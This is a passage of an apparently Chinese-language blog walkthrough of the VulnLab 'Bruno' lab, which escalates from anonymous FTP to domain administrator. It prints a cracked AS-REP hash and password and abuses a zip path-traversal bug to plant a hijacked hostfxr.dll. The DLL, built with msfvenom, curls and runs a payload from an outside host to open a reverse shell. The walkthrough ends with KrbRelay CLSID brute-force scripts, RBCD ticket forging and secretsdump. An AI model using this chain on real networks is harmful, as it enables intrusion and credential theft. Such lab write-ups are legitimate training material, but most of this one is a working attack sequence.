+<p>看到裏面有四個文件夾，因爲有讀取的權限，裏面也有一些文件，嘗試寫入看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111140759-p09ha54.png" alt="image">​</p>
+<p>結果都寫入失敗了，所以使用 <code>wget</code>​ 把 FTP 的文件全部下載下來：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -r --no-parent ftp://anonymous@10.10.87.115 -P ftp_files</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>/app</code>​ 的文件夾裏面有一堆文件，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111135906-qa0nlqd.png" alt="image">​</p>
+<p>其中的 <code>changelog</code>​ 暗示著有一個 <code>dev</code>​的網站，由於直接使用 ip 打開端口也沒有，加一個 vhost 嘗試訪問  <code>dev.bruno.vl</code>​ 后就出現了一個頁面：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111135837-blybi05.png" alt="image">​</p>
+<p>但是這些按鈕全都是假的，不過上面的 <code>Queue</code>​ 和 <code>Benign</code>​ 還有 <code>Malicious</code>​ 全都是 FTP 裏面的文件。</p>
+<h2 id="AS-REP-Roasting-attack"><a href="#AS-REP-Roasting-attack" class="headerlink" title="AS-REP Roasting attack"></a>AS-REP Roasting attack</h2><p>另外在 <code>changelog</code>​ 中也暗示著 <code>svc_scan</code>​ 是一個服務賬號，所以嘗試一下 <code>asreproast attack</code>​和 <code>kerberoasting attack</code>​：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#x27;svc_scan&#x27; &gt; user</span><br><span class="line">$ GetNPUsers.py -usersfile user bruno.vl/</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111140224-m4l7rm0.png" alt="image">​</p>
+<p>結果 <code>svc_scan</code>​ 用戶有設置 <code>pre-auth</code>​，既然有了hash那就嘗試破解一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$svc_scan@BRUNO.VL:e4a1f5c25b576231aeb193786a6082f1$8dec35e779b3ef2d90c9d5745821433956cb75baea0afd874656df6f4aa70c2bcb987ad3945b3da841d23679a8bb416c2ce55f6741b24aca00d780ac676ee533cb3403a6b1127d97b01c2049f91557bfefce8335ac8089ddbeb2855cdba9e5a7864af063a55f226dc5ec6066a19d5ca011e05cc28e7b9e426ad2c005b91657a73a7419bdbd37f269552a368bbd7900cdeca59d2b675473af7ae2fb745980c57797b0498fa62422b46d4fd3365bd015bbece0ab6ae89a57384f6f5e9894e11610495751b38e2aae708bb038bca42c1008bc36aab669c20ea3665df006d564be10f4a44db1</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111140300-dokpyiq.png" alt="image">​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sunshine1</span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumerate-the-file-share-directory-for-smb"><a href="#Enumerate-the-file-share-directory-for-smb" class="headerlink" title="Enumerate the file share directory for smb"></a>Enumerate the file share directory for smb</h2><p>結果破解成功，看一下 smb 之後看到該用戶可以讀寫 <code>queue</code>​ 的共享目錄：​​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.10.87.115 -u svc_scan -p &#x27;Sunshine1&#x27; </span><br><span class="line">$ netexec smb 10.10.87.115 -u svc_scan -p &#x27;Sunshine1&#x27; --shares</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111140447-hej5mkg.png" alt="image">​</p>
+<p>另外還注意到安裝了 ADCS：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec ldap 10.10.87.115 -u svc_scan -p &#x27;Sunshine1&#x27; -M adcs</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111140521-emk56t6.png" alt="image">​</p>
+<p>後來發現其實沒什麽用。</p>
+<h1 id="Play-and-reverse-SampleScammer"><a href="#Play-and-reverse-SampleScammer" class="headerlink" title="Play and reverse SampleScammer"></a>Play and reverse SampleScammer</h1><p>既然他給了 <code>SampleScammer.exe</code>​ 之類的東西，網站也是和文件掃描有關，那就在本地建立一個測試環境，看看會發生什麽。</p>
+<p>運行發現是一個 donet 的東西（因爲 donet 的東西最好反編譯了），需要安裝 donet 才可以正常打開：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111135610-wfomod8.png" alt="image">​</p>
+<p>所以去<a target="_blank" rel="noopener" href="https://aka.ms/dotnet-core-applaunch?framework=Microsoft.NETCore.App&amp;framework_version=3.1.0&amp;arch=x64&amp;rid=win-x64&amp;os=win10">官網</a>下載一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111141624-v4lzj4q.png" alt="image">​</p>
+<p>點擊桌面版的 <code>x64</code>​ 下載完成后又出現了另一個錯誤：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111141652-g0bv7sd.png" alt="image">​</p>
+<p>看起來是 <code>C:\samples\queue</code>​ 這個是固定的，所以創建一個文件夾在<code>C:\samples\queue</code>​，再次運行發現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111141705-rj0c77w.png" alt="image">​</p>
+<p>又出現了另一個錯誤。</p>
+<h2 id="Analysis-donet-source-code"><a href="#Analysis-donet-source-code" class="headerlink" title="Analysis donet source code"></a>Analysis donet source code</h2><p>由於FTP中給了4個文件夾（很容易猜到 ftp 就是共享 <code>C:\samples</code>​），那就全部下載下來，放到<code>C:\samples</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111142045-r4n3uxt.png" alt="image">​</p>
+<p>打開後，閃了一下，看起來沒有錯誤提示，似乎可以正常運行。</p>
+<p>所以打算反編譯看看裏面寫了什麽，如果使用 <code>ILSpy</code>​ 反編譯<code>SampleScanner.exe</code>​ 裏面什麽也沒有，使用 <code>detect it easy</code>​ 發現這個程序是個<code>C++</code>​ 寫的，這不對勁，因爲上面的報錯是關於 donet 的。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118152932-yq4qtsl.png" alt="image">​</p>
+<p>除非有殼，不然 donet 寫出來的東西最後得到的exe 不太可能是 C++，但是在同一個目錄下面有另一個文件 <code>SampleScanner.dll</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118153206-gphhzeb.png" alt="image">​</p>
+<p>拖進去<code>detect it easy</code>​ 發現這是個 <code>C#</code>​，這就對了，所以嘗試使用 <code>ILSPY</code>​ 反編譯看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111142556-ohpfoqi.png" alt="image">​</p>
+<p>這裏有個很明顯的bug，儅解壓目錄是絕對目錄的時候就會出現問題，比如：</p>
+<ul>
+<li>我的壓縮包裏面有一個文件是 <code>test.txt</code>​ ，就會解壓到 <code>C:\\samples\\queue</code>​。</li>
+<li>但是壓縮包可以是絕對路徑，也就是如果我壓縮包裏面的文件是 <code>C:\\mane\\test.txt</code>​，則會直接解壓到 <code>C:\\mane\\test.txt</code>​。</li>
+</ul>
+<h2 id="Finding-DLL-Hijack-location"><a href="#Finding-DLL-Hijack-location" class="headerlink" title="Finding DLL Hijack location"></a>Finding DLL Hijack location</h2><p>也就是利用這個 bug 可以寫入任意文件，要想獲得一個shell，就只能從 exe 入手，看看那個 exe 有沒有 dll hijack，如果有就可以寫入一個惡意的dll讓他啓動時加載，這樣就可以得到 reverse shell。所以使用 <code>process monitor</code>​ 看看啓動時加載了哪些 dll：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111142756-dk7ye88.png" alt="image">​</p>
+<p>看起來他好像在加載 <code>hostfxr.dll</code>​，嘗試製作一個dll然後放到程序的目錄看看。</p>
+<p>爲了測試，就需要製作一個 dll ，最快的方法就是用 msfvenom 生成一個。</p>
+<p>這裏的 dll 就簡單的運行一些 cmd 的命令，主要的用途就是讓他可以下載 payload 并且運行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 加載時會嘗試從 http 服務器下載 payload 并且嘗試運行</span><br><span class="line">$ msfvenom -p windows/x64/exec -f dll CMD=&#x27;cmd.exe /k &quot;mkdir C:\mane &amp; curl 192.168.31.161/mane.exe -o C:\mane\mane.exe &amp; C:\mane\mane.exe&quot;&#x27; -o hostfxr.dll</span><br><span class="line"></span><br><span class="line"># payload 運行的内容就是簡單的打開 cmd.exe</span><br><span class="line">$ msfvenom -p windows/x64/exec -f exe CMD=&#x27;cmd.exe&#x27; -o mane.exe</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111144915-364e2jj.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111144857-gikr2cl.png" alt="image">​</p>
+<p>所以把生成的 <code>hostfxr.dll</code>​ 放在和程序相同的文件夾，然後雙擊 <code>SampleScanner.exe</code>​ 看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111145004-pvq6j6g.png" alt="image">​</p>
+<p>結果成功的運行了 payload，既然他可以成功的執行了payload，那麽dll hijack 這條路就行得通。</p>
+<h2 id="Pack-DLL-into-zip-and-change-zip-absolute-path"><a href="#Pack-DLL-into-zip-and-change-zip-absolute-path" class="headerlink" title="Pack DLL into zip and change zip absolute path"></a>Pack DLL into zip and change zip absolute path</h2><p>接下來就是測試解壓的時候是不是和前面的那樣，會放到指定的地方。</p>
+<p>首先把 <code>hostfxr.dll</code>​ 使用 7z 壓縮到 zip，然後用 7z 打開，打開後直接按F2來重新命名，輸入 <code>C:\samples\app\hostfxr.dll</code>​ 后如下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111145201-atdjq14.png" alt="image">​</p>
+<p>儅輸入完后點擊任意的地方就會出現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250111145254-q919b7z.png" alt="image">​</p>
+<p>這樣的 zip 就製作好了，接下來把 zip 放到 <code>C:\samples\queue</code>​，打開 <code>SampleScanner.exe</code>​ 看一下會發生什麽：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/demo2-20250111145614-rc5cvla.gif" alt="demo2">​</p>
+<p>你可以看到在第一次運行 <code>SampleScanner.exe</code>​ 的時候會嘗試解壓zip的内容到<code>C:\samples\app\hostfxr.dll</code>​，第二次啓動就會嘗試加載惡意dll 裏的内容了。</p>
+<h1 id="Upload-into-smb-and-get-reverse-shell"><a href="#Upload-into-smb-and-get-reverse-shell" class="headerlink" title="Upload into smb and get reverse shell"></a>Upload into smb and get reverse shell</h1><p>這時候重新製作 dll，然後 payload 就使用 reverse shell，重新打包後使用 smb 上傳到 <code>queue</code>​ 這個目錄：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -U &quot;svc_scan%Sunshine1&quot; //10.10.87.115/queue</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118093958-eq3enct.png" alt="image">​</p>
+<p>等到一會就得到了 shell：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118094048-ner3vq4.png" alt="image">​</p>
+<p>這個shell沒有特殊權限，不過有 <code>SeMachineAccountPrivilege</code>​。</p>
+<h2 id="Running-winpeas-and-exploit-krbRelayUp"><a href="#Running-winpeas-and-exploit-krbRelayUp" class="headerlink" title="Running winpeas and exploit krbRelayUp"></a>Running winpeas and exploit krbRelayUp</h2><p>嘗試跑一下 winpeas，看到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118102539-g2ev9i6.png" alt="image">​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cachedlogonscount is 10</span><br></pre></td></tr></table></figure>
+
+<p>這意味著當前用戶可以增加10個機器賬號，而且也發現 winpeas 顯示嘗試使用 krbrelayup：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118102619-4pnx71w.png" alt="image">​</p>
+<p>根據上面的提示找到：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Dec0ne/KrbRelayUp">https://github.com/Dec0ne/KrbRelayUp</a></li>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9">https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/cube0x0/KrbRelay/">https://github.com/cube0x0/KrbRelay/</a></li>
+</ul>
+<p>其中第二篇文章比較有用，首先先創建一個機器賬號，然後使用 bug 的方法給DC增加一個 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>​ 指向剛剛創建的機器賬號，這樣就可以進行 RBCD attack。</p>
+<p>這個 bug 的方法其實就是<code>Kerberos Relay attack</code>​，其中需要：</p>
+<ul>
+<li>有一個開放的TCP端口用作 COM 服務器（因爲當 COM 伺服器收到 UseProtSeq 呼叫時，它會嘗試將 TCP 伺服器綁定到所有接口，這隨後會觸發 Windows Defender 防火牆提示使用者進行存取。管理員才允許打開windows上的防火墻，即使COM的服務器是在本地運行且不需要監聽所有外部連接的端口，但是Windows Defender 還是會去阻擋COM連接，這樣你就會得到 <code>&quot;The RPC server is unavailable. (Exception from HRESULT: 0x800706BA)&quot;</code>​）</li>
+<li>需要一個 CLSID。</li>
+<li>LDAP 的簽名是非强制的（默認配置） 且 DCOM 的身份驗證等級在 <code>RPC_C_AUTHN_LEVEL_PKT_INTEGRITY</code>​ 以下。</li>
+<li>賬號允許增加一臺電腦。</li>
+</ul>
+<h2 id="Requirement-1-look-around-ldap-signing"><a href="#Requirement-1-look-around-ldap-signing" class="headerlink" title="Requirement 1 - look around ldap signing"></a>Requirement 1 - look around ldap signing</h2><p>首先看一下 LDAP 的簽名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec ldap 10.10.126.180 -u svc_scan -p &#x27;Sunshine1&#x27; -M ldap-checker</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118175940-7cd5jj4.png" alt="image">​</p>
+<p>可以看到默認是非强制的，這樣第三個條件就滿足了。</p>
+<h2 id="Requirement-2-Add-a-computer-into-domain"><a href="#Requirement-2-Add-a-computer-into-domain" class="headerlink" title="Requirement 2 - Add a computer into domain"></a>Requirement 2 - Add a computer into domain</h2><p>然後新建一臺電腦：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ powerview svc_scan:Sunshine1@10.10.101.5</span><br><span class="line">PV &gt; Add-DomainComputer -ComputerName manepc -ComputerPass P@ssw0rd123</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118103427-v5188jr.png" alt="image">​</p>
+<p>新建成功後獲取新建電腦的SID：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PV &gt; Get-DomainComputer -Identity manepc</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118103544-pxtwhok.png" alt="image">​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-1536375944-4286418366-3447278137-1116</span><br></pre></td></tr></table></figure>
+
+<p>得到了SID，這樣滿足了第四個條件。</p>
+<h2 id="Requirement-3-Finding-port-can-pass-the-firewall-via-checkport-exe"><a href="#Requirement-3-Finding-port-can-pass-the-firewall-via-checkport-exe" class="headerlink" title="Requirement 3 - Finding port can pass the firewall via checkport.exe"></a>Requirement 3 - Finding port can pass the firewall via checkport.exe</h2><p>那麽第一個條件要怎麽完成呢？因爲普通用戶沒有權限去看防火墻的配置。</p>
+<p>那就使用使用 <code>.\checkport.exe</code>​ 來從 10 到 65535 依次掃描開放的端口（<a target="_blank" rel="noopener" href="https://github.com/cube0x0/KrbRelay/blob/0c170134b9ef275a14b725aa718c4e3ca862dcdf/CheckPort/Program.cs#L31">爲什麽是10？</a>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\mane&gt; .\checkport.exe</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118103734-q6zy0s5.png" alt="image">​</p>
+<p>可以看到系統允許 <code>10246</code>​端口。</p>
+<h2 id="Requirement-4-Finding-CLSID-and-bruteforcing"><a href="#Requirement-4-Finding-CLSID-and-bruteforcing" class="headerlink" title="Requirement 4 - Finding CLSID and bruteforcing"></a>Requirement 4 - Finding CLSID and bruteforcing</h2><p>四個條件滿足了三個，最後的條件就是獲取有用的CLSID，看一下當前系統的版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\mane&gt; systeminfo</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118103959-dx21oed.png" alt="image">​</p>
+<p>但我去搜索了一下 <code>SERVER 2022 CLSID github</code>​ 結果啥都沒有，於是嘗試使用 <a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard">SERVER 2016 的CLSID</a>，隨便挑了一個，出現：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\mane&gt; .\KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-1536375944-4286418366-3447278137-1116 -port 10246</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118104352-49juu6h.png" alt="image">​</p>
+<p>卡了一段時間後，顯示了失敗：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118104907-z5rfo7o.png" alt="image">​</p>
+<p>還好 <a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">juicy-potato</a> 的原項目有提供 <a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1">GetCLSID.ps1</a>，那就下載下來運行一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118110132-3qqd2u5.png" alt="image">​</p>
+<p>等待一段時間後，會在本地目錄下生成一個文件夾：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118110204-4kdegb2.png" alt="image">​</p>
+<p>裏面有 <code>CLSID.list</code>​ 和 <code>CLSIDs.csv</code>​，把 <code>CLSIDs.csv</code>​下載下來，打開後發現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118113247-sdq70qe.png" alt="image">​</p>
+<p>這麽多個 CLSID 又不知道哪個能用怎麽辦？那就只能大力出奇跡了。。。（爆破！）</p>
+<p>所以把 <code>Appid</code>​ 和 <code>CLSID</code>​ 分別保存到兩個文件之後上傳到對面的機器，并且寫個脚本隨便爆破一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$filePath = &quot;C:\mane\clsid.txt&quot;</span><br><span class="line"></span><br><span class="line">Get-Content $filePath | ForEach-Object &#123;</span><br><span class="line">    $clsid = $_ -replace &#x27;&#123;&#x27;, &#x27;&#x27; -replace &#x27;&#125;&#x27;, &#x27;&#x27;</span><br><span class="line">	$clsid = $clsid.Trim()</span><br><span class="line"></span><br><span class="line">	Write-Output &quot;[###########] Testing ... $clsid [###########]&quot;</span><br><span class="line">	&amp; C:\mane\KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid $clsid -rbcd S-1-5-21-1536375944-4286418366-3447278137-1116 -port 10246</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118113335-l52il8q.png" alt="image">​</p>
+<p>但是很可惜， <code>clsid.txt</code>​ 裏的所有内容都不工作，剩下就嘗試爆破下 <code>appid.txt</code>​了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$filePath = &quot;C:\mane\appid.txt&quot;</span><br><span class="line"></span><br><span class="line">Get-Content $filePath | ForEach-Object &#123;</span><br><span class="line">    $clsid = $_ -replace &#x27;&#123;&#x27;, &#x27;&#x27; -replace &#x27;&#125;&#x27;, &#x27;&#x27;</span><br><span class="line">	$clsid = $clsid.Trim()</span><br><span class="line"></span><br><span class="line">	Write-Output &quot;[###########] Testing ... $clsid [###########]&quot;</span><br><span class="line">	&amp; C:\mane\KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid $clsid -rbcd S-1-5-21-1536375944-4286418366-3447278137-1116 -port 10246</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118113919-f4d15h2.png" alt="image">​</p>
+<p>看了一下記錄，發現 <code>ldap_modify: LDAP_SUCCESS</code>​ 也就是修改 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>​ 成功了！</p>
+<p>看了下記錄，下面兩個 APPID 可以工作（為也不知道爲何是APPID裏的值）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d99e6e74-fc88-11d0-b498-00a0c90312f3</span><br><span class="line">42cbfaa7-a4a7-47bb-b422-bd10e9d02700</span><br></pre></td></tr></table></figure>
+
+<p>所以完整的命令是這樣的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid D99E6E74-FC88-11D0-B498-00A0C90312F3 -rbcd S-1-5-21-1536375944-4286418366-3447278137-1116 -port 10246</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118114051-z57n8ds.png" alt="image">​</p>
+<p>修改成功了之後，在DC的ldap 屬性 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>​會有值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\mane&gt; Get-NetComputer brunodc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118114233-f7axx6g.png" alt="image">​</p>
+<p>有值説明修改成功，這樣就可以RBCD attack 然後得到admin 用戶：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ getST.py &#x27;bruno.vl/manepc$&#x27;@bruno.vl  -spn host/brunodc.bruno.vl -impersonate administrator</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118114837-socsgmp.png" alt="image">​</p>
+<p>之後有了 admin 的ticket 直接 <code>secretsdump.py</code>​ 得到 admin 的hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py bruno.vl/administrator@brunodc.bruno.vl -k -no-pass</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118115234-fc6iu0d.png" alt="image">​</p>
+<p>然後 pass the hash 得到 admin 的 shell。</p>
+<h2 id="Optional-Using-KrbRelayUp-to-automate"><a href="#Optional-Using-KrbRelayUp-to-automate" class="headerlink" title="(Optional) Using KrbRelayUp to automate"></a>(Optional) Using KrbRelayUp to automate</h2><p>有沒有一種快點的方法呢？</p>
+<p>答案是有的，那就是 <a target="_blank" rel="noopener" href="https://github.com/Dec0ne/KrbRelayUp">KrbRelayUp</a>。這款工具就是整合了上面的所有步驟，簡化了利用的過程。</p>
+<p>但是 CLSID 仍然要手動爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\KrbRelayUp.exe full -m rbcd -c </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118115854-um18rii.png" alt="image">​</p>
+<p>不然你會出現上面的錯誤。</p>
+<p>所以只需要告訴這款工具能用的CLSID，新建機器的賬號和密碼，它就會自己掃描可以用的端口，然後新建機器，并且嘗試自動化 <code>Kerberos Relay attack</code>​：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\KrbRelayUp.exe full -m rbcd -c -cn maneattack -cp Passw0rd123 -cls &#123;d99e6e74-fc88-11d0-b498-00a0c90312f3&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118120308-0py3asg.png" alt="image">​</p>
+<p>所以接下來就和上面的一樣：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ getST.py &#x27;bruno.vl/maneattack$&#x27;@bruno.vl  -spn host/brunodc.bruno.vl -impersonate administrator</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118120419-cmnez2j.png" alt="image">​</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 